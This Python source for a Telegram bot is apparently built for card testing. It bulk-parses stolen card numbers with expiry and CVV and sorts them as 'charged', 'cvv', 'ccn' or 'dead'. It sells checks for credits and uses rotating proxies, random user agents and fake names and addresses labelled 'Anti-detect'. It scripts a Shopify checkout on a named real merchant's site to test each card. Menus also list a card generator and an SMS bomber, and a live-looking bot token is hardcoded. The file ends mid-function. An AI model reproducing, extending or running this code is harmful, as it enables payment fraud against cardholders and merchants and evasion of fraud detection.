
#---------×IMPORTS×------------#
import telebot
import random
import urllib
from fake_useragent import UserAgent
from datetime import datetime  
import json 
import hashlib
import asyncio
import string
import io
import sys
import re
import os
from typing import Dict, Any, List, Tuple
import subprocess
import logging
import aiofiles
from datetime import datetime, timezone
import threading
import aiohttp
import base64
import uuid
from urllib.parse import urlencode, quote
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
)
#---------×IMPORTS×------------#
USER_DB_FILE = "user_db.json"
GIFT_DB_FILE = "gift_codes.json"
RESULT_FILES = ["charged.txt", "cvv.txt", "ccn.txt", "dead.txt", "3ds.txt"]
PROXIES_FILE = "proxies.json"

import concurrent.futures
import time
import requests
MP_STC_POOL = concurrent.futures.ProcessPoolExecutor(max_workers=8)
EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=4)



def load_data():
    if os.path.exists(PROXIES_FILE):
        try:
            with open(PROXIES_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {'users': {}, 'proxies': {}}

def save_data(data):
    with open(PROXIES_FILE, 'w') as f:
        json.dump(data, f, indent=2)
        
        
# ========== GLOBALS ==========
app_ref: Application = None

# per-chat async queue storing tuples (user_id:int, cards:List[str], job_id:str)
# We will enqueue each user's job (can be 1 card or multiple cards from file)
check_queues: Dict[int, asyncio.Queue] = {}
# background consumer tasks per chat
chat_consumers: Dict[int, asyncio.Task] = {}

# user cooldown timestamps (unix)
user_cooldown: Dict[int, float] = {}
COOLDOWN_SECONDS = 15

# daily checks: {chat_id: {user_id: count}}
daily_checks: Dict[int, Dict[int, int]] = {}


# user database cache loaded from file
user_db_lock = asyncio.Lock()

# running jobs progress: job_id -> progress info
running_jobs: Dict[str, Dict[str, Any]] = {}

# helper to generate job ids
def gen_job_id() -> str:
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(12))


# ========== ENHANCED MULTI-USER SUPPORT SYSTEM ==========

# User session management
user_sessions: Dict[int, Dict[str, Any]] = {}
user_locks: Dict[int, asyncio.Lock] = {}

def get_user_session(user_id: int) -> Dict[str, Any]:
    """Get or create user session"""
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'active_checks': 0,
            'total_checks': 0,
            'last_check': None,
            'current_job': None,
            'queue': asyncio.Queue(),
            'worker_task': None
        }
    if user_id not in user_locks:
        user_locks[user_id] = asyncio.Lock()
    return user_sessions[user_id]

async def process_user_queue(user_id: int):
    """Process checks for a specific user's queue"""
    session = get_user_session(user_id)
    
    while True:
        try:
            # Get next check from queue
            check_data = await session['queue'].get()
            
            if check_data is None:  # Poison pill to stop worker
                break
            
            # Process the check
            session['active_checks'] += 1
            session['last_check'] = datetime.now()
            
            # Your checking logic here
            # ...
            
            session['active_checks'] -= 1
            session['total_checks'] += 1
            session['queue'].task_done()
            
        except Exception as e:
            logger.exception(f"User {user_id} queue processing error: {e}")
            await asyncio.sleep(1)

def start_user_worker(user_id: int):
    """Start background worker for user if not already running"""
    session = get_user_session(user_id)
    
    if session['worker_task'] is None or session['worker_task'].done():
        session['worker_task'] = asyncio.create_task(process_user_queue(user_id))
        logger.info(f"Started worker for user {user_id}")

def stop_user_worker(user_id: int):
    """Stop background worker for user"""
    session = get_user_session(user_id)
    
    if session['worker_task'] and not session['worker_task'].done():
        session['queue'].put_nowait(None)  # Poison pill
        logger.info(f"Stopped worker for user {user_id}")

# ========== END MULTI-USER SUPPORT ==========

#Multi users support#


import threading
import time

def worker_task(user_id, thread_id):
    while True:
        print(f"[User {user_id}] Thread {thread_id} working...")
        time.sleep(1)

def start_user_worker(user_id):
    print(f"[PROCESS STARTED] User {user_id}")

    threads = []
    for i in range(5):
        t = threading.Thread(target=worker_task, args=(user_id, i+1))
        t.daemon = True
        t.start()
        threads.append(t)

    # Keep process running
    for t in threads:
        t.join()
                            

from multiprocessing import Process
active_users = {}  # user_id → process object

def start_process_for_user(user_id):
    if user_id in active_users:
        print(f"[INFO] Process already running for {user_id}")
        return
    
    p = Process(target=start_user_worker, args=(user_id,))
    p.daemon = True
    p.start()
    
    active_users[user_id] = p
    print(f"[OK] Started process for {user_id}")

def stop_process_for_user(user_id):
    if user_id in active_users:
        active_users[user_id].terminate()
        active_users[user_id].join()
        del active_users[user_id]
        print(f"[OK] Stopped process for {user_id}")
  
        

async def register_user(user_id: int, username: str):
    async with user_db_lock:
        db = await load_user_db()
        key = str(user_id)
        if key not in db:
            db[key] = {"username": username or "", "credits": 0}
            await save_user_db(db)
            
# ========== UTILITIES ==========
async def save_json_atomic(path: str, data: Any):
    temp = path + ".tmp"
    async with aiofiles.open(temp, "w", encoding="utf-8") as f:
        await f.write(json.dumps(data, ensure_ascii=False, indent=2))
    os.replace(temp, path)

async def load_json(path: str) -> Any:
    if not os.path.exists(path):
        return {}
    async with aiofiles.open(path, "r", encoding="utf-8") as f:
        txt = await f.read()
        if not txt.strip():
            return {}
        return json.loads(txt)
        
async def load_user_db() -> Dict[str, Any]:
    return await load_json(USER_DB_FILE)

async def save_user_db(db: Dict[str, Any]):
    await save_json_atomic(USER_DB_FILE, db)
        
#---------×BOT_INSTALLATION×-------------#
BOT_TOKEN = os.getenv("BOT_TOKEN", "8542683733:AAG8_Z6e0Ivd9xwQGC0ucSbsEwiWtv3vSS0")
#--------×BOT_INSTALLATION×----------#

# ========== INTELLIGENT CARD PARSER ==========
def parse_card_intelligent(card_string: str) -> dict:
    """
    Intelligently parse card from various formats:
    - 4532015112830366|12|2025|123
    - 4532015112830366|12|25|123
    - 4532015112830366 12 2025 123
    - 4532015112830366:12:2025:123
    - 4532015112830366/12/2025/123
    - 4532015112830366 12/25 123
    - Card: 4532015112830366, Exp: 12/25, CVV: 123
    """
    if not card_string or not isinstance(card_string, str):
        return None
    
    # Remove common prefixes
    card_string = card_string.strip()
    card_string = re.sub(r'^(card|cc|number|num|pan)\s*[:=]?\s*', '', card_string, flags=re.IGNORECASE)
    
    # Try standard format with various delimiters
    patterns = [
        # Standard: num|mm|yyyy|cvv or num|mm|yy|cvv
        r'(\d{15,16})\s*[\|\:\-\/\s]\s*(\d{1,2})\s*[\|\:\-\/\s]\s*(\d{2,4})\s*[\|\:\-\/\s]\s*(\d{3,4})',
        # With exp prefix: num exp: mm/yy cvv
        r'(\d{15,16})\s*(?:exp|expiry|valid)?\s*[:=]?\s*(\d{1,2})\s*[\/\-]\s*(\d{2,4})\s*(?:cvv|cvc|csv|code)?\s*[:=]?\s*(\d{3,4})',
        # Space separated: num mm yyyy cvv
        r'(\d{15,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        # Loose format
        r'(\d{15,16}).*?(\d{1,2}).*?(\d{2,4}).*?(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            num, mm, yy, cvv = match.groups()
            
            # Normalize month
            mm = mm.zfill(2)
            if int(mm) > 12 or int(mm) < 1:
                continue
            
            # Normalize year
            if len(yy) == 4:
                if yy.startswith('20'):
                    yy = yy[2:]
                else:
                    continue  # Invalid year
            yy = yy.zfill(2)
            
            # Validate CVV
            if len(cvv) < 3 or len(cvv) > 4:
                continue
            
            return {
                'number': num,
                'month': mm,
                'year': yy,
                'cvv': cvv,
                'formatted': f"{num}|{mm}|{yy}|{cvv}",
                'original': card_string
            }
    
    return None

def parse_cards_from_text(text: str, max_cards: int = 2500) -> list:
    """
    Parse multiple cards from text with intelligent format detection
    Returns list of formatted cards (num|mm|yy|cvv)
    """
    if not text:
        return []
    
    lines = text.strip().split('\n')
    parsed_cards = []
    seen = set()  # For deduplication
    
    for line in lines:
        if len(parsed_cards) >= max_cards:
            break
        
        line = line.strip()
        if not line or len(line) < 20:  # Too short to be a valid card
            continue
        
        # Try to parse the card
        card_data = parse_card_intelligent(line)
        
        if card_data and card_data['formatted'] not in seen:
            seen.add(card_data['formatted'])
            parsed_cards.append(card_data['formatted'])
    
    return parsed_cards

def validate_card_number(card_number: str) -> bool:
    """Luhn algorithm validation"""
    try:
        digits = [int(d) for d in card_number if d.isdigit()]
        if len(digits) < 15 or len(digits) > 16:
            return False
        
        checksum = 0
        for i, digit in enumerate(reversed(digits)):
            if i % 2 == 1:
                digit *= 2
                if digit > 9:
                    digit -= 9
            checksum += digit
        
        return checksum % 10 == 0
    except:
        return False

# ========== ENHANCED UI COMPONENTS ==========
def create_main_menu_keyboard():
    """Create beautiful main menu with inline buttons"""
    keyboard = [
        [
            InlineKeyboardButton("🎴 Card Checker", callback_data="menu_checker"),
            InlineKeyboardButton("💳 My Credits", callback_data="menu_credits")
        ],
        [
            InlineKeyboardButton("🛠️ Tools", callback_data="menu_tools"),
            InlineKeyboardButton("📊 Statistics", callback_data="menu_stats")
        ],
        [
            InlineKeyboardButton("🎁 Redeem Gift", callback_data="menu_redeem"),
            InlineKeyboardButton("👥 Multi-User Info", callback_data="menu_multiuser")
        ],
        [
            InlineKeyboardButton("ℹ️ Help & Commands", callback_data="menu_help"),
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_checker_menu_keyboard():
    """Create checker submenu with different gate options"""
    keyboard = [
        [
            InlineKeyboardButton("� Single SH", callback_data="check_auth"),
            InlineKeyboardButton("🔴 Single ST", callback_data="check_stripe")
        ],
        [
            InlineKeyboardButton("📋 Mass SH", callback_data="check_mauth"),
            InlineKeyboardButton("📊 Mass ST", callback_data="check_mstripe")
        ],
        [
            InlineKeyboardButton("🎯 Stripe Check", callback_data="check_stripe"),
            InlineKeyboardButton("�️ Shopify Check", callback_data="check_shopify")
        ],
        [
            InlineKeyboardButton("🔐 CKO Check", callback_data="check_cko"),
            InlineKeyboardButton("�️ Shopify2 Check", callback_data="check_shopify2")
        ],
        [
            InlineKeyboardButton("🔄 Sort Cards", callback_data="tool_sort"),
            InlineKeyboardButton("📊 Scan BIN", callback_data="tool_scan")
        ],
        [
            InlineKeyboardButton("⬅️ Back to Main Menu", callback_data="menu_main")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_tools_menu_keyboard():
    """Create tools submenu"""
    keyboard = [
        [
            InlineKeyboardButton("🎲 Generate Cards", callback_data="tool_gen"),
            InlineKeyboardButton("🔍 BIN Lookup", callback_data="tool_bin")
        ],
        [
            InlineKeyboardButton("✂️ Split Cards", callback_data="tool_split"),
            InlineKeyboardButton("📋 Sort File", callback_data="tool_sortf")
        ],
        [
            InlineKeyboardButton("🌐 Proxy Manager", callback_data="tool_proxy"),
            InlineKeyboardButton("💣 SMS Bomber", callback_data="tool_bomb")
        ],
        [
            InlineKeyboardButton("🔗 Backlinks", callback_data="tool_backlinks"),
            InlineKeyboardButton("🖼️ Image Magic", callback_data="tool_magic")
        ],
        [InlineKeyboardButton("⬅️ Back to Main Menu", callback_data="menu_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_stats_keyboard():
    """Create statistics keyboard"""
    keyboard = [
        [
            InlineKeyboardButton("📈 My Stats", callback_data="stats_personal"),
            InlineKeyboardButton("🏆 Leaderboard", callback_data="stats_leaderboard")
        ],
        [
            InlineKeyboardButton("👥 All Users", callback_data="stats_allusers"),
            InlineKeyboardButton("📊 Bot Stats", callback_data="stats_bot")
        ],
        [InlineKeyboardButton("⬅️ Back to Main Menu", callback_data="menu_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_admin_menu_keyboard():
    """Create admin panel keyboard"""
    keyboard = [
        [
            InlineKeyboardButton("🎁 Generate Gift", callback_data="admin_gift"),
            InlineKeyboardButton("💰 Add Credits", callback_data="admin_addcredits")
        ],
        [
            InlineKeyboardButton("👑 Promote Admin", callback_data="admin_promote"),
            InlineKeyboardButton("👤 Demote Admin", callback_data="admin_demote")
        ],
        [
            InlineKeyboardButton("📋 View Admins", callback_data="admin_list"),
            InlineKeyboardButton("📰 Send News", callback_data="admin_news")
        ],
        [InlineKeyboardButton("⬅️ Back to Main Menu", callback_data="menu_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_back_button(callback_data="menu_main"):
    """Create a simple back button"""
    keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data=callback_data)]]
    return InlineKeyboardMarkup(keyboard)

def format_progress_bar(current, total, length=10):
    """Create a visual progress bar"""
    filled = int((current / total) * length) if total > 0 else 0
    bar = "█" * filled + "░" * (length - filled)
    percentage = (current / total * 100) if total > 0 else 0
    return f"{bar} {percentage:.1f}%"

def format_checker_response(card, result, animate=True):
    """Format checker response with beautiful UI"""
    status = result.get('status', 'Unknown')
    message = result.get('message', 'No message')
    gateway = result.get('gateway', 'Unknown')
    
    # Determine emoji based on status
    if 'approved' in status.lower() or 'charged' in status.lower():
        emoji = EMOJI_STATUS['approved']
        status_color = "✨"
    elif 'declined' in status.lower():
        emoji = EMOJI_STATUS['declined']
        status_color = "⚠️"
    elif 'ccn' in status.lower():
        emoji = EMOJI_STATUS['ccn']
        status_color = "⚠️"
    elif 'cvv' in status.lower():
        emoji = EMOJI_STATUS['cvv']
        status_color = "🔒"
    else:
        emoji = EMOJI_STATUS['error']
        status_color = "❓"
    
    response = f"""
{status_color}━━━━━━━━━━━━━━━━━━{status_color}
{emoji} **CARD CHECK RESULT**

💳 **Card:** `{card}`
🏦 **Gateway:** {gateway}
📊 **Status:** {status}
💬 **Response:** {message}
{status_color}━━━━━━━━━━━━━━━━━━{status_color}
"""
    return response

# ========== END ENHANCED UI COMPONENTS ==========

#-------×COMMAND_HANDLER_TOKEN×----------#
TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN", "8542683733:AAG8_Z6e0Ivd9xwQGC0ucSbsEwiWtv3vSS0")
TOKEN = os.getenv("BOT_TOKEN", "8542683733:AAG8_Z6e0Ivd9xwQGC0ucSbsEwiWtv3vSS0")
#-------×COMMAND_HANDLER_TOKEN×----------#

import logging


# after your logging.basicConfig(…) call add:
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram.vendor.httpx").setLevel(logging.WARNING)
logging.getLogger("telegram.bot").setLevel(logging.WARNING)
logging.getLogger("telegram.ext._application").setLevel(logging.WARNING)




bot = telebot.TeleBot(BOT_TOKEN)
#--------------------×BOT×----------------------#

async def cmd_register(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db = await load_user_db()
    if str(user.id) in db:
        await update.message.reply_text("You are already registered.")
        return
    await register_user(user.id, user.username or "")
    await update.message.reply_text("Registration successful! Your credits are 0. Use /credits to view them.")


#--------×ADMIN×-----------#
#OWNER_ID = 6127646960
ADMINS_FILE = "admins.json"
OWNER_ID = 6127646960  # configured owner id

def load_admins():
    try:
        with open(ADMINS_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}

def save_admins(m):
    try:
        with open(ADMINS_FILE, "w", encoding="utf-8") as fh:
            json.dump(m, fh, indent=2)
    except Exception:
        pass

def is_owner_uid(uid):
    try:
        return int(uid) == int(OWNER_ID)
    except Exception:
        return False

def is_admin_uid(uid):
    try:
        if is_owner_uid(uid):
            return True
        admins = load_admins()
        return str(int(uid)) in admins
    except Exception:
        return False
        
async def cmd_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_owner_uid(user.id):
        await update.message.reply_text("⛔ Only the owner can promote admins.")
        return
    parts = (update.message.text or "").split(maxsplit=2)
    if len(parts) < 3:
        await update.message.reply_text("Usage: /promote <user_id> <nickname>")
        return
    try:
        uid = str(int(parts[1].strip()))
    except Exception:
        await update.message.reply_text("Invalid user id.")
        return
    nick = parts[2].strip()
    admins = load_admins()
    admins[uid] = nick
    save_admins(admins)
    await update.message.reply_text(f"✅ Promoted {nick} ({uid}) to admin.")

async def cmd_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_owner_uid(user.id):
        await update.message.reply_text("⛔ Only the owner can demote admins.")
        return
    parts = (update.message.text or "").split(maxsplit=1)
    if len(parts) < 2:
        await update.message.reply_text("Usage: /demote <user_id>")
        return
    try:
        uid = str(int(parts[1].strip()))
    except Exception:
        await update.message.reply_text("Invalid user id.")
        return
    admins = load_admins()
    if uid in admins:
        nick = admins.pop(uid)
        save_admins(admins)
        await update.message.reply_text(f"✅ Demoted {nick} ({uid}).")
    else:
        await update.message.reply_text("❌ That user id is not in admin list.")

async def cmd_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admins = load_admins()
    lines = []
    lines.append(f"👑 Owner: {OWNER_ID}")
    if not admins:
        lines.append("No admins set.")
    else:
        lines.append("Admins:")
        for uid, nick in admins.items():
            lines.append(f"• {nick} — {uid}")
    await update.message.reply_text("\\n".join(lines))
        
        

#-------------------×globals×------------------#
TXT_FILE = None

PROXIES = []

LOCK = asyncio.Lock()



proxy_list = []

DATA_FILE = 'checker_data.json'


#test_proxy = random.choice(proxy_list) 

CHARGED = 0
DEAD = 0
ERROR = 0
TOTAL = 0
CHECKED = 0
DS = 0



ANIMATION_FRAMES = ["🌑", "🌒", "🌓", "🌔", "🌕", "🌖", "🌗", "🌘"] 

# Enhanced Animation Frames
LOADING_ANIMATIONS = {
    "dots": ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"],
    "blocks": ["▱▱▱", "▰▱▱", "▰▰▱", "▰▰▰"],
    "arrows": ["←", "↖", "↑", "↗", "→", "↘", "↓", "↙"],
    "circle": ["◐", "◓", "◑", "◒"],
    "fire": ["🔥", "🧨", "💥", "✨", "⚡"],
    "cards": ["🃏", "🎴", "🎰", "💳", "💎"],
    "progress": ["▁", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃"],
}

EMOJI_STATUS = {
    "approved": "✅",
    "declined": "❌",
    "processing": "⏳",
    "charged": "💰",
    "ccn": "⚠️",
    "cvv": "🔒",
    "3ds": "🛡️",
    "error": "⚠️",
    "pending": "⏱️",
}

#-------------------×globals×--------------------#







#--------------×JSON_db×----------------#
def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {'users': {}, 'gift_codes': {}}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)
#------------------×DB×----------------------#

#---------------Gareeb_management------------#
#-------×Get_credits×----------#
def get_user_credits(user_id):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        return data['users'][user_id_str].get('credits', 0)
    return 0
#-------×Get_credits×----------#

#-------×Add_Gareeb×----------#
def add_user(user_id, username):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str not in data['users']:
        data['users'][user_id_str] = {
            'username': username,
            'credits': 0,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        save_data(data)
#-------×Add_Gareeb×----------#


#------×Gareeb_ke_paise_khao×---------#
def deduct_credit(user_id):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        data['users'][user_id_str]['credits'] -= 1
        data['users'][user_id_str]['total_checks'] += 1
        save_data(data)
#------×Gareeb_ke_paise_khao×---------#


#-------×Gareeb_ko_daan_do×----------#
def add_credits(user_id, amount):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        data['users'][user_id_str]['credits'] += amount
    else:
        data['users'][user_id_str] = {
            'username': 'Unknown',
            'credits': amount,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    save_data(data)
#-------×Gareeb_ko_daan_do×----------#


#-------×Gareeb_Giveway×------------#
def generate_gift_code(credits, admin_id):
    code = hashlib.md5(f"{time.time()}{random.randint(1000, 9999)}".encode()).hexdigest()[:12].upper()
    data = load_data()
    data['gift_codes'][code] = {
        'credits': credits,
        'created_by': admin_id,
        'created_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'is_used': False,
        'redeemed_by': None,
        'redeemed_date': None
    }
    save_data(data)
    return code
#-------×Gareeb_Giveway×------------#


#--------×Gareeb_Happy×------------#
def redeem_gift_code(code, user_id):
    data = load_data()
    code = code.upper()
    
    if code not in data['gift_codes']:
        return False, "Invalid gift code"
    
    gift = data['gift_codes'][code]
    
    if gift['is_used']:
        return False, "Gift code already used"
    
    # Mark as used
    data['gift_codes'][code]['is_used'] = True
    data['gift_codes'][code]['redeemed_by'] = user_id
    data['gift_codes'][code]['redeemed_date'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Add credits to user
    credits = gift['credits']
    user_id_str = str(user_id)
    
    # Ensure user exists
    if user_id_str not in data['users']:
        data['users'][user_id_str] = {
            'username': 'Unknown',
            'credits': 0,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    
    # Add credits
    data['users'][user_id_str]['credits'] += credits
    
    # Save everything at once
    save_data(data)
    
    return True
    
#-------------------Happy_Gareeb--------------------#

#------------Anti-detect-Random-address---------------#
us_addresses = [
    {"address1": "123 Main St", "address2": "", "city": "New York", "countryCode": "US", "postalCode": "10001", "zoneCode": "NY", "lastName": "Doe", "firstName": "John"},
    {"address1": "456 Oak Ave", "address2": "", "city": "Los Angeles", "countryCode": "US", "postalCode": "90001", "zoneCode": "CA", "lastName": "Smith", "firstName": "Emily"},
    {"address1": "789 Pine Rd", "address2": "", "city": "Chicago", "countryCode": "US", "postalCode": "60601", "zoneCode": "IL", "lastName": "Johnson", "firstName": "Alex"},
    {"address1": "101 Elm St", "address2": "", "city": "Houston", "countryCode": "US", "postalCode": "77001", "zoneCode": "TX", "lastName": "Miller", "firstName": "Nico"},
    {"address1": "202 Maple Dr", "address2": "", "city": "Phoenix", "countryCode": "US", "postalCode": "85001", "zoneCode": "AZ", "lastName": "Brown", "firstName": "Tom"},
    {"address1": "303 Cedar Ln", "address2": "", "city": "Philadelphia", "countryCode": "US", "postalCode": "19101", "zoneCode": "PA", "lastName": "Davis", "firstName": "Sarah"},
    {"address1": "404 Birch Blvd", "address2": "", "city": "San Antonio", "countryCode": "US", "postalCode": "78201", "zoneCode": "TX", "lastName": "Wilson", "firstName": "Liam"},
    {"address1": "505 Walnut St", "address2": "", "city": "San Diego", "countryCode": "US", "postalCode": "92101", "zoneCode": "CA", "lastName": "Moore", "firstName": "Emma"},
    {"address1": "606 Spruce Ave", "address2": "", "city": "Dallas", "countryCode": "US", "postalCode": "75201", "zoneCode": "TX", "lastName": "Taylor", "firstName": "Oliver"},
    {"address1": "707 Ash Rd", "address2": "", "city": "San Jose", "countryCode": "US", "postalCode": "95101", "zoneCode": "CA", "lastName": "Anderson", "firstName": "Ava"},
]
#------------Anti-detect-Random-address---------------#
#should add more#

#-------Random_address_add---------#
def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""
#-------Random_address_add---------#

#-------×Proxy_list_me_se_proxy_chori×-----------#
def get_random_proxy():
    if proxy_list:
        return random.choice(proxy_list)
    return None
#-------×Proxy_list_me_se_proxy_chori×-----------#


#----------------×Pagal_banane_wle_naam×---------------#
first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam", "Emma", "Oliver", "Ava"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore", "Taylor", "Anderson", "Thomas"]
#----------------×Pagal_banane_wle_naam×---------------#


#------------------------×Bin_lookup×-----------------------#
def get_bin_info(bin_number):
    """Get BIN information from API"""
    try:
        url = f"https://lookup.binlist.net/{bin_number}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            
            # Extract info
            scheme = data.get('scheme', 'UNKNOWN').upper()
            card_type = data.get('type', 'UNKNOWN').upper()
            brand = data.get('brand', 'UNKNOWN').upper()
            bank_name = data.get('bank', {}).get('name', 'UNKNOWN').upper()
            country_name = data.get('country', {}).get('name', 'UNKNOWN').upper()
            country_emoji = data.get('country', {}).get('emoji', '🌍')
            
            return {
                'scheme': scheme,
                'type': card_type,
                'brand': brand,
                'bank': bank_name,
                'country': country_name,
                'emoji': country_emoji
            }
    except:
        pass
    
    #----------Api_chudi_backup----------#
    return {
        'scheme': 'UNKNOWN',
        'type': 'UNKNOWN',
        'brand': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'emoji': '🌍'
    }
#------------------------×Bin_lookup×-----------------------#


#-----------------×Faltu_Delay×-----------------#
def random_delay(min_sec=0.3, max_sec=0.8):
 
    delay = random.uniform(min_sec, max_sec)
    time.sleep(delay)
    print(f"⏳ Random delay: {delay:.2f}s")
#-----------------×Faltu_Delay×-----------------#  


#---------------×Random_addrs_uthaana×----------------#
def get_random_address():
    
    return random.choice(us_addresses)
#---------------×Random_addrs_uthaana×----------------#


#------------------×/sh_Command×---------------------#
async def sh_check(card_details, username, msg=None):
    loop = asyncio.get_running_loop()

    # Send "checking..." message
    if msg:
        await msg.reply_text(f"Checking: {card_details}")

    # Run the heavy logic in multiprocessing
    result = await loop.run_in_executor(None, lambda: _mp_worker(card_details, username))

    return result


    from multiprocessing import Pool, cpu_count

# This is the real heavy checker that will run inside a subprocess
def _mp_worker(card_details, username=None, proxy_list_snapshot=None):
    # your logic here
    """
    This ONLY executes the long heavy logic of sh_check.
    You will paste the heavy logic of sh_check into this function.
    NO async here because multiprocessing cannot run async code.
    """
    import re, time

    start_time = time.time()
    text = card_details.strip()
    pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
    match = re.search(pattern, text)

    if not match:
        return "Invalid card format. Please provide a valid card number, month, year and CVV."

    n = match.group(1)
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm_raw = match.group(2)
    mm = str(int(mm_raw))
    yy_raw = match.group(3)
    cvc = match.group(4)

    # year fix
    if len(yy_raw) == 4 and yy_raw.startswith("20"):
        yy = yy_raw[2:]
    elif len(yy_raw) == 2:
        yy = yy_raw
    else:
        return "Invalid year format."

    full_card = f"{n}|{mm_raw.zfill(2)}|{yy}|{cvc}"

#------------------×/sh_Command×---------------------#


#-------------------×Very_much_Security×------------------#
    ua = UserAgent()
    user_agent = ua.random
    gen_email = lambda: f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com"
    remail = gen_email()
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)
    random_addr = get_random_address()
    addr1 = random_addr["address1"]
    addr2 = random_addr["address2"]
    city = random_addr["city"]
    country_code = random_addr["countryCode"]
    postal = random_addr["postalCode"]
    zone = random_addr["zoneCode"]
    #------Random_name_for_addrss--------#
    addr_last = random.choice(last_names).lower()
#-------------------×Very_much_Security×------------------#

    #----------×New_Sessions×----------#
    #---------×For_each_check×----------#
    session = requests.Session()
    #----------×New_Sessions×----------#
    #---------×For_each_check×----------#
    
    #----------×Proxy_Rotate×-----------#
    proxy = get_random_proxy()
    if proxy:
        session.proxies.update(proxy)
        print(f"Using proxy: {proxy['http']}")
     
  
    #----------×Proxy_Rotate×-----------#
    

    #----------×Adding_To_Cart×-----------#
    print("StEp OnE : AdDinG_To_cArT.........")
    url = "https://violettefieldthreads.com/cart/add.js"
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/products/presley-doll-pants-preorder',
        'user-agent': user_agent,
    }
    data = {
        'form_type': 'product',
        'utf8': '✓',
        'id': '41957285840',
        'quantity': '1',
    }
    response = session.post(url, headers=headers, data=data, proxies=proxy if proxy else None)
    random_delay(0.2, 0.5)  # Minimal delay
    if response.status_code != 200:
        return f"Failed at step 1: Add to cart. Status: {response.status_code}"
    #----------×Adding_To_Cart×-----------#
    
    #---------×Getting_Cart_Token×------------#
    print("Step 2: Fetching cart...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://violettefieldthreads.com/products/presley-doll-pants-preorder',
        'user-agent': user_agent,
    }
    response = session.get('https://violettefieldthreads.com/cart.js', headers=headers, proxies=proxy if proxy else None)
    raw = response.text
    random_delay(0.2, 0.5)
    try:
        res_json = json.loads(raw)
        tok = res_json['token']
    except json.JSONDecodeError:
        return "Failed at step 2: Could not decode cart JSON"
    #---------×Getting_Cart_Token×------------#
    
    
    #---------×Posting_To_cart_page×----------#
    print("Step 3: Posting to cart page...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/cart',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user_agent,
    }
    data = {
        'updates[]': '1',
        'checkout': 'Check out',
    }        
    response = session.post(
        'https://violettefieldthreads.com/cart',
        headers=headers,
        data=data,
        allow_redirects=True,
        proxies=proxy if proxy else None
    )
    text = response.text
    x = find_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
    queue_token = find_between(text, '&quot;queueToken&quot;:&quot;', '&quot;')
    stableid = find_between(text, 'stableId&quot;:&quot;', '&quot;')
    paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

